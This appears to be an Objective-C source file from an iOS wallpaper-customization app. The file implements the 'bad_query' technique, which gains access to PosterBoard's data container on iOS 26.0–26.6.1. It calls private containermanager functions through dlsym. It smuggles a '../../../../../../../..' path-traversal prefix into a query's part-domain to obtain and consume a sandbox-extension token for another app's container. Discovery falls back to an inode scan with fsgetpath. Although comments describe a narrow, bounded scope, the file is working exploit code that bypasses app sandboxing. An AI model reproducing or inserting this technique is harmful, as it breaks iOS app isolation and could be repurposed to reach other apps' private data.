// SPDX-License-Identifier: GPL-3.0-only
// Adapted from 3105 (YangJiii and contributors), commit
// a72617ed4c764a65d8aac1e91aca95231e72a2cb, exploit/mcm_bridge.m and bad_query.c.
// The bad_query sandbox-extension technique is by forcequitOS.
// Discovery also follows Placard/Bad-Poster's bounded fsgetpath/metadata approach.
// Modified for TendiesVN on 2026-10-16: only PosterBoard and fixed container
// metadata paths, retained extensions, normal Bundle IDs, and no process restart.
// See LICENSE and THIRD_PARTY_NOTICES.md in the project root.
#import "PosterBoardBridge.h"
#import <dlfcn.h>
#import <dirent.h>
#import <errno.h>
#import <fcntl.h>
#import <limits.h>
#import <objc/message.h>
#import <stdlib.h>
#import <string.h>
#import <sys/fsgetpath.h>
#import <sys/mount.h>
#import <sys/stat.h>
#import <unistd.h>
#import <xpc/xpc.h>

static NSString *const PosterBoardIdentifier = @"com.apple.PosterBoard";
static NSString *const ApplicationDataRoot = @"/private/var/mobile/Containers/Data/Application";
static NSString *const MetadataName = @".com.apple.mobile_container_manager.metadata.plist";
static NSString *const CachedUUIDKey = @"TendiesVN.PosterBoardContainerUUID.v2";
static const uint64_t MaximumDiscoveryInode = 2000000;
static const NSUInteger MaximumMetadataCandidates = 4096;
static const off_t MaximumMetadataBytes = 1024 * 1024;

typedef void *(*MCMQueryCreate)(void);
typedef void (*MCMQuerySetU64)(void *, uint64_t);
typedef void (*MCMQuerySetXPC)(void *, xpc_object_t);
typedef void (*MCMQuerySetDomain)(void *, const char *);
typedef void *(*MCMQueryGetPointer)(void *);
typedef char *(*MCMCopyToken)(void *);
typedef const char *(*MCMGetString)(void *);
typedef void (*MCMQueryFree)(void *);
typedef int64_t (*SandboxConsume)(const char *);
typedef int (*SandboxRelease)(int64_t);

typedef struct {
    void *handle;
    MCMQueryCreate queryCreate;
    MCMQuerySetU64 querySetClass;
    MCMQuerySetXPC querySetIdentifiers;
    MCMQuerySetXPC querySetGroupIdentifiers;
    MCMQuerySetU64 querySetFlags;
    MCMQuerySetU64 querySetPart;
    MCMQuerySetDomain querySetPartDomain;
    MCMQueryGetPointer queryGetSingle;
    MCMQueryFree queryFree;
    MCMGetString objectGetPath;
    MCMGetString objectGetIdentifier;
    MCMCopyToken objectCopyToken;
    SandboxConsume consume;
    SandboxRelease release;
} MCMAPI;

static MCMAPI *MCMSharedAPI(void) {
    static MCMAPI api;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        api.handle = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
        void *handle = api.handle ?: RTLD_DEFAULT;
#define LOAD(field, symbol) api.field = (__typeof(api.field))dlsym(handle, symbol)
        LOAD(queryCreate, "container_query_create");
        LOAD(querySetClass, "container_query_set_class");
        LOAD(querySetIdentifiers, "container_query_set_identifiers");
        LOAD(querySetGroupIdentifiers, "container_query_set_group_identifiers");
        LOAD(querySetFlags, "container_query_operation_set_flags");
        LOAD(querySetPart, "container_query_operation_set_part");
        LOAD(querySetPartDomain, "container_query_operation_set_part_domain");
        LOAD(queryGetSingle, "container_query_get_single_result");
        LOAD(queryFree, "container_query_free");
        LOAD(objectGetPath, "container_object_get_path");
        LOAD(objectGetIdentifier, "container_object_get_identifier");
        LOAD(objectCopyToken, "container_copy_sandbox_token");
#undef LOAD
        api.consume = (SandboxConsume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
        api.release = (SandboxRelease)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    });
    return &api;
}

static BOOL BadQueryAvailable(void) {
    MCMAPI *api = MCMSharedAPI();
    return api->queryCreate && api->querySetClass && api->querySetGroupIdentifiers &&
        api->querySetFlags && api->querySetPart && api->querySetPartDomain &&
        api->queryGetSingle && api->queryFree && api->objectCopyToken &&
        api->consume && api->release;
}

static BOOL SupportedSystemVersion(void) {
    NSOperatingSystemVersion version = NSProcessInfo.processInfo.operatingSystemVersion;
    return version.majorVersion == 26 && version.minorVersion >= 0 &&
        (version.minorVersion < 6 ||
         (version.minorVersion == 6 && version.patchVersion <= 1));
}

static NSString *CanonicalApplicationRoot(NSString *rawPath) {
    if (![rawPath isKindOfClass:NSString.class] || !rawPath.isAbsolutePath) return nil;
    NSString *path = rawPath;
    if ([path hasPrefix:@"/var/"]) path = [@"/private" stringByAppendingString:path];
    path = path.stringByStandardizingPath;
    if (![path.stringByDeletingLastPathComponent isEqualToString:ApplicationDataRoot]) return nil;
    if (![[NSUUID alloc] initWithUUIDString:path.lastPathComponent]) return nil;
    return path;
}

static void ReleaseExtension(int64_t handle) {
    if (handle >= 0) MCMSharedAPI()->release(handle);
}

// This helper is private and has no caller-controlled paths. Its only accepted
// targets are an Application/UUID root or its one fixed MCM metadata file.
// Root grants are requested only after the metadata identifies PosterBoard.
static int64_t ConsumeScopedExtension(NSString *path, NSString **error) {
    BOOL isRoot = [CanonicalApplicationRoot(path) isEqualToString:path];
    BOOL isMetadata = [path.lastPathComponent isEqualToString:MetadataName] &&
        [CanonicalApplicationRoot(path.stringByDeletingLastPathComponent)
            isEqualToString:path.stringByDeletingLastPathComponent];
    if (!isRoot && !isMetadata) {
        if (error) *error = @"TQ00: rejected a path outside the wallpaper scope";
        return -1;
    }
    if (!BadQueryAvailable()) {
        if (error) *error = @"TQ01: required iOS access functions are unavailable";
        return -1;
    }
    MCMAPI *api = MCMSharedAPI();
    void *query = api->queryCreate();
    if (!query) {
        if (error) *error = @"TQ02: could not create the access query";
        return -1;
    }
    // Class 13 routes to containermanagerd_system. The part-domain construction
    // and operation flags are the bad_query mechanism, independent of the
    // host app's Bundle ID. This does not create a new app/container.
    api->querySetClass(query, 13);
    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    api->querySetGroupIdentifiers(query, identifier);
    api->querySetPart(query, 3);
    NSString *part = [@"../../../../../../../.." stringByAppendingString:path];
    api->querySetPartDomain(query, part.fileSystemRepresentation);
    api->querySetFlags(query, 0x0000008000000000ULL);
    int64_t handle = -1;
    void *result = api->queryGetSingle(query);
    if (!result) {
        if (error) *error = @"TQ03: iOS denied the access query; check the iOS version";
    } else {
        char *token = api->objectCopyToken(result);
        if (!token || !token[0]) {
            if (error) *error = @"TQ04: iOS returned no sandbox extension";
        } else {
            handle = api->consume(token);
            if (handle < 0 && error) *error = @"TQ05: iOS rejected the sandbox extension";
        }
        free(token);
    }
    api->queryFree(query);
#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif
    return handle;
}

// Read only the bounded metadata file; never read another app's Documents,
// preferences, or other content while looking for PosterBoard. The extension is
// released before returning, including for every nonmatching candidate.
static BOOL MetadataIdentifiesPosterBoard(NSString *rootPath, NSString **error) {
    if (![CanonicalApplicationRoot(rootPath) isEqualToString:rootPath]) return NO;
    NSString *metadataPath = [rootPath stringByAppendingPathComponent:MetadataName];
    int64_t handle = -1;
    int descriptor = open(metadataPath.fileSystemRepresentation, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
    if (descriptor < 0) {
        handle = ConsumeScopedExtension(metadataPath, error);
        if (handle < 0) return NO;
        descriptor = open(metadataPath.fileSystemRepresentation, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
    }
    if (descriptor < 0) {
        if (error) *error = @"TP01: container metadata is unreadable; open Wallpaper settings and retry";
        ReleaseExtension(handle);
        return NO;
    }
    struct stat attributes;
    NSMutableData *data = nil;
    if (fstat(descriptor, &attributes) == 0 && S_ISREG(attributes.st_mode) &&
        attributes.st_size > 0 && attributes.st_size <= MaximumMetadataBytes) {
        data = [NSMutableData dataWithLength:(NSUInteger)attributes.st_size];
        NSUInteger offset = 0;
        while (offset < data.length) {
            ssize_t count = read(descriptor, (uint8_t *)data.mutableBytes + offset, data.length - offset);
            if (count < 0 && errno == EINTR) continue;
            if (count <= 0) { data = nil; break; }
            offset += (NSUInteger)count;
        }
    }
    close(descriptor);
    ReleaseExtension(handle);
    id metadata = data ? [NSPropertyListSerialization propertyListWithData:data
        options:NSPropertyListImmutable format:NULL error:NULL] : nil;
    if (![metadata isKindOfClass:NSDictionary.class]) return NO;
    return [metadata[@"MCMMetadataIdentifier"] isEqual:PosterBoardIdentifier];
}

// Exact, metadata-only lookup. It does not request an MHA-privileged extension.
static NSString *PosterBoardRootFromMCM(void) {
    MCMAPI *api = MCMSharedAPI();
    if (!api->queryCreate || !api->querySetClass || !api->querySetIdentifiers ||
        !api->querySetFlags || !api->queryGetSingle || !api->queryFree ||
        !api->objectGetPath || !api->objectGetIdentifier) return nil;
    void *query = api->queryCreate();
    if (!query) return nil;
    api->querySetClass(query, 2);
    xpc_object_t identifier = xpc_string_create(PosterBoardIdentifier.UTF8String);
    api->querySetIdentifiers(query, identifier);
    api->querySetFlags(query, 0x100000000ULL);
    if (api->querySetPart) api->querySetPart(query, 0);
    void *result = api->queryGetSingle(query);
    const char *rawIdentifier = result ? api->objectGetIdentifier(result) : NULL;
    const char *rawPath = result ? api->objectGetPath(result) : NULL;
    NSString *root = nil;
    if (rawIdentifier && rawPath && strcmp(rawIdentifier, PosterBoardIdentifier.UTF8String) == 0) {
        root = CanonicalApplicationRoot([NSString stringWithUTF8String:rawPath]);
    }
    api->queryFree(query);
#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif
    return root;
}

static NSString *PosterBoardRootFromLaunchServices(void) {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        if (!NSClassFromString(@"LSApplicationProxy")) {
            // Retain the framework handle for the Objective-C classes' lifetime.
            dlopen("/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices", RTLD_LAZY | RTLD_LOCAL);
        }
    });
    Class proxyClass = NSClassFromString(@"LSApplicationProxy");
    SEL lookup = NSSelectorFromString(@"applicationProxyForIdentifier:");
    if (!proxyClass || ![proxyClass respondsToSelector:lookup]) return nil;
    @try {
        id proxy = ((id (*)(id, SEL, id))objc_msgSend)(proxyClass, lookup, PosterBoardIdentifier);
        if (!proxy) return nil;
        for (NSString *name in @[@"dataContainerURL", @"containerURL"]) {
            SEL selector = NSSelectorFromString(name);
            if (![proxy respondsToSelector:selector]) continue;
            id value = ((id (*)(id, SEL))objc_msgSend)(proxy, selector);
            NSString *path = [value isKindOfClass:NSURL.class] ? [value path] : value;
            NSString *root = CanonicalApplicationRoot(path);
            if (root) return root;
        }
    } @catch (__unused NSException *exception) {
        // Private LaunchServices selectors vary. Fall back to fixed metadata.
    }
    return nil;
}

static NSString *DiscoverPosterBoardRoot(NSString **error) {
    NSMutableSet<NSString *> *examined = [NSMutableSet set];
    __block NSString *lastAccessFailure = nil;
    BOOL (^matches)(NSString *) = ^BOOL(NSString *rawPath) {
        NSString *root = CanonicalApplicationRoot(rawPath);
        if (!root || [examined containsObject:root] || examined.count >= MaximumMetadataCandidates) return NO;
        [examined addObject:root];
        NSString *detail = nil;
        BOOL valid = MetadataIdentifiesPosterBoard(root, &detail);
        if (detail) lastAccessFailure = detail;
        return valid;
    };
    NSString *cachedUUID = [NSUserDefaults.standardUserDefaults stringForKey:CachedUUIDKey];
    if (cachedUUID.length && [[NSUUID alloc] initWithUUIDString:cachedUUID]) {
        NSString *cachedRoot = [ApplicationDataRoot stringByAppendingPathComponent:cachedUUID];
        if (matches(cachedRoot)) return cachedRoot;
    }
    [NSUserDefaults.standardUserDefaults removeObjectForKey:CachedUUIDKey];
    NSString *lookupRoot = PosterBoardRootFromMCM();
    if (matches(lookupRoot)) return lookupRoot;
    lookupRoot = PosterBoardRootFromLaunchServices();
    if (matches(lookupRoot)) return lookupRoot;
    // On builds that allow names to be listed, avoid an inode scan. Do not
    // request a recursive extension for the Application parent directory.
    DIR *directory = opendir(ApplicationDataRoot.fileSystemRepresentation);
    if (directory) {
        struct dirent *entry;
        while ((entry = readdir(directory)) && examined.count < MaximumMetadataCandidates) {
            NSString *name = [NSString stringWithUTF8String:entry->d_name];
            if (!name.length || ![[NSUUID alloc] initWithUUIDString:name]) continue;
            NSString *root = [ApplicationDataRoot stringByAppendingPathComponent:name];
            if (matches(root)) { closedir(directory); return root; }
        }
        closedir(directory);
    }
    // This is the same bounded fallback used by Placard/Bad-Poster. Filter
    // fsgetpath results before opening anything, inspect only direct UUID roots,
    // and stop as soon as the one PosterBoard metadata identity is found.
    struct statfs fileSystem;
    if (statfs("/private/var", &fileSystem) != 0 &&
        statfs("/var", &fileSystem) != 0 &&
        statfs(NSHomeDirectory().fileSystemRepresentation, &fileSystem) != 0) {
        if (error) *error = @"TP02: container discovery is unavailable; reopen the app and retry";
        return nil;
    }
    fsid_t filesystemID = fileSystem.f_fsid;
    char buffer[PATH_MAX];
    for (uint64_t inode = 1; inode <= MaximumDiscoveryInode &&
         examined.count < MaximumMetadataCandidates; inode++) {
        ssize_t count = fsgetpath(buffer, sizeof(buffer), &filesystemID, inode);
        if (count <= 0 || (size_t)count >= sizeof(buffer)) continue;
        buffer[count] = '\0';
        @autoreleasepool {
            NSString *root = CanonicalApplicationRoot([NSString stringWithUTF8String:buffer]);
            if (root && matches(root)) return root;
        }
    }
    if (error) *error = lastAccessFailure ?:
        @"TP03: PosterBoard was not found; open Settings > Wallpaper once and retry";
    return nil;
}

@interface TendiesPosterBoardLease : NSObject {
    int64_t _extensionHandle;
}
@property(nonatomic, copy) NSString *rootPath;
+ (nullable instancetype)leaseWithError:(NSString **)error;
- (BOOL)validate:(NSString **)error;
@end

@implementation TendiesPosterBoardLease
- (instancetype)init {
    self = [super init];
    if (self) _extensionHandle = -1;
    return self;
}
+ (instancetype)leaseWithError:(NSString **)error {
    NSString *rootPath = DiscoverPosterBoardRoot(error);
    if (!rootPath) return nil;
    // Discovery has already proved the metadata identity. Retain the actual
    // consumed sandbox-extension handle for subsequent install/rollback calls.
    int64_t handle = ConsumeScopedExtension(rootPath, error);
    if (handle < 0) return nil;
    TendiesPosterBoardLease *lease = [TendiesPosterBoardLease new];
    lease->_extensionHandle = handle;
    lease.rootPath = rootPath;
    if (![lease validate:error]) return nil;
    [NSUserDefaults.standardUserDefaults setObject:rootPath.lastPathComponent forKey:CachedUUIDKey];
    return lease;
}
- (BOOL)validate:(NSString **)error {
    if (_extensionHandle < 0 || !MetadataIdentifiesPosterBoard(self.rootPath, error)) {
        if (error && !*error) *error = @"TP04: PosterBoard metadata identity could not be verified";
        return NO;
    }
    int descriptor = open(self.rootPath.fileSystemRepresentation,
        O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
    if (descriptor < 0) {
        if (error) *error = [NSString stringWithFormat:@"TP05: PosterBoard root access denied (errno %d)", errno];
        return NO;
    }
    close(descriptor);
    char resolved[PATH_MAX];
    if (!realpath(self.rootPath.fileSystemRepresentation, resolved) ||
        ![self.rootPath isEqualToString:[NSString stringWithUTF8String:resolved]]) {
        if (error) *error = @"TP06: PosterBoard root contains an unexpected symbolic link";
        return NO;
    }
    return YES;
}
- (void)dealloc {
    ReleaseExtension(_extensionHandle);
}
@end

NSString *TendiesPosterBoardContainerPath(NSString **error) {
    if (error) *error = nil;
    if (!SupportedSystemVersion()) {
        if (error) *error = @"TV01: this access method supports iOS 26.0 through 26.6.1";
        return nil;
    }
    if (!BadQueryAvailable()) {
        if (error) *error = @"TQ01: required iOS access functions are unavailable";
        return nil;
    }
    static TendiesPosterBoardLease *retainedLease;
    @synchronized (TendiesPosterBoardLease.class) {
        if (retainedLease && [retainedLease validate:NULL]) return retainedLease.rootPath;
        retainedLease = nil;
        retainedLease = [TendiesPosterBoardLease leaseWithError:error];
        return retainedLease.rootPath;
    }
}
